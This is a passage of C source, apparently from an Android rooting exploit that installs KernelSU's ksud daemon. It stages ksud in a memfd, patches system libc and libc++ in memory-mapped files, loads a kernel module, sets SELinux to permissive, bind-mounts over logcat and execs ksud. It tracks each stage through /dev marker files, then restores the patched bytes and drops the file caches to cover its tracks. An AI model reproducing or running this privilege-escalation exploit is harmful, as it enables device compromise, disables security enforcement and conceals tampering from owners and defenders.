            REPORTLN("ksud path length invalid: %zu", ksud_path_len);
            (*env)->ReleaseStringUTFChars(env, jksudPath, ksud_path);
            return 3;
        }
        int src = open(ksud_path, O_RDONLY | O_CLOEXEC);
        (*env)->ReleaseStringUTFChars(env, jksudPath, ksud_path);
        if (src < 0) {
            REPORTLN("open ksud failed: %s", strerror(errno));
            return 3;
        }
        struct stat st;
        if (fstat(src, &st) != 0 || st.st_size <= 0) {
            REPORTLN("ksud size invalid: %lld", (long long)st.st_size);
            close(src);
            return 3;
        }
        REPORTLN("ksud: %lld bytes", (long long)st.st_size);
        ksud_mfd = (int)syscall(__NR_memfd_create, "ksud", MFD_CLOEXEC);
        if (ksud_mfd < 0) {
            REPORTLN("memfd_create failed: %s", strerror(errno));
            close(src);
            return 3;
        }
        int copy_ok = 1;
        char buf[4096];
        ssize_t n;
        while ((n = read(src, buf, sizeof(buf))) > 0) {
            for (ssize_t w = 0; w < n; ) {
                ssize_t r = write(ksud_mfd, buf + w, (size_t)(n - w));
                if (r <= 0) { copy_ok = 0; break; }
                w += r;
            }
            if (!copy_ok) break;
        }
        if (n < 0 || !copy_ok) {
            REPORTLN("ksud copy failed");
            close(src);
            close(ksud_mfd);
            return 3;
        }
        close(src);
        char proc_path[64];
        snprintf(proc_path, sizeof(proc_path), "/proc/%d/fd/%d",
                 getpid(), ksud_mfd);
        strncpy(libc_data + libc_ksud_proc_path_off, proc_path, 63);
        libc_data[libc_ksud_proc_path_off + 63] = '\0';
        libc_data[libc_soft_reboot_off] = softReboot ? 1 : 0;
        REPORTLN("ksud mfd: %s", proc_path);
    }

    struct PatchRestore libc_r = {0}, libcxx_r = {0};

    int rc = 3;
    if (patch_ko(reporter)) goto done;
    if (patch_hook("/system/lib64/libc.so", "__libc_init",
                   libc_data, libc_len, libc_start, libc_first_inst_copy,
                   reporter, &libc_r)) goto done;
    if (patch_hook("/system/lib64/libc++.so",
                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   reporter, &libcxx_r)) goto done;

    static const struct {
        const char *path;
        const char *msg;
        int fatal_rc;      /* 0 = informational; otherwise the pass result */
    } markers[] = {
        { "/dev/df",    "stage1: libc++ mutex acquired, forking",     0 },
        { "/dev/dfm0",  "stage2: module loaded - selinux permissive", 0 },
        { "/dev/dfm7",  "stage2: finit_module FAILED (module/KMI)",   4 },
        { "/dev/dfm1",  "stage2: reading ksud from memfd",            0 },
        { "/dev/dfm8",  "stage2: ksud memfd not readable",            6 },
        { "/dev/dfm2",  "stage2: staging ksud files",                 0 },
        { "/dev/dfm9",  "stage2: cannot open /dev/.ksud",             6 },
        { "/dev/dfmA",  "stage2: cannot open /data/system/ksud",      6 },
        { "/dev/dfm3",  "stage2: switching namespace",                0 },
        { "/dev/dfmB",  "stage2: unshare/private mount FAILED",       5 },
        { "/dev/dfm4",  "stage2: bind mounting logcat",               0 },
        { "/dev/dfmC",  "stage2: bind mount FAILED",                  5 },
        { "/dev/dfm5",  "stage2: launching ksud",                     0 },
        { "/dev/dfm6",  "stage2: ksud execve FAILED",                 1 },
    };
    rc = 2;
    usleep(500000);
    struct mark_state state[sizeof(markers)/sizeof(markers[0])];
    for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
        state[j].path = markers[j].path;
    }
    mark_snapshot(state, sizeof(state)/sizeof(state[0]));
    REPORTLN("* triggering...");
    createOrphanProcess(reporter);

    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
        usleep(10000);
        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
            if (state[j].existed == -1 || !mark_is_new(&state[j])) continue;
            state[j].existed = -1;
            REPORTLN("%s", markers[j].msg);
            if (strcmp(markers[j].path, "/dev/dfm0") == 0) {
                /* The module is in kernel memory; the vendor library can go
                 * back to its original bytes instead of holding a KO image. */
                restore_vendor_lib(reporter);
            }
            if (markers[j].fatal_rc) {
                rc = markers[j].fatal_rc;
                goto done;
            }
            if (strcmp(markers[j].path, "/dev/dfm5") == 0) {
                // Stage 2 creates this only after the exec status pipe
                // reaches EOF, so exec failure is already excluded.
                REPORTLN("***SUCCESS***");
                rc = 0;
                goto done;
            }
        }
    }
    REPORTLN("***FAILED***: check logs");
done:
    if (rc == 3) REPORTLN("***FAILED***: failed to patch files");
    REPORTLN("\n=== cleanup ===");
    restore_hook(&libcxx_r, reporter);
    restore_hook(&libc_r, reporter);
    restore_vendor_lib(reporter);
    fadvise_drop("/system/lib64/libc.so", reporter);
    fadvise_drop("/system/lib64/libc++.so", reporter);
    free(libcxx_r.shell_orig);
    free(libc_r.shell_orig);
    if (ksud_mfd >= 0) close(ksud_mfd);
    uint64_t elapsed_ms = monotonic_ms() - g_metrics.started_ms;
    REPORTLN("metrics: helper=%lu pipes=%lu packets=%lu bytes=%lu elapsed=%llums",
             g_metrics.helper_execs, g_metrics.pipes, g_metrics.packets,
             g_metrics.bytes_patched, (unsigned long long)elapsed_ms);
    return rc;
}
